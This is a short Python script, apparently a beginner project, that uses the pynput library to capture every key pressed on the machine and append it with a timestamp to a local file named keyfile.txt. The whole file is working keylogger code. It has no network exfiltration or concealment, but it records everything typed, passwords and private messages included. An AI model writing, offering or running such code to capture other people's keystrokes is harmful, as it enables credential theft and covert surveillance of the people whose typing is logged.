from pynput import keyboard
from datetime import datetime

def keyPressed(key):
    try:
        char = key.char
    except AttributeError:
        char = f'[{key}]'  # handles special keys
    
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")# extracting the time in the properformat
    log_entry = f"{time} - {char}\n" #saving the key pressed and the time to a variable

    with open("keyfile.txt", 'a') as log_key:
        log_key.write(log_entry)#write the time and key pressed to the file

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
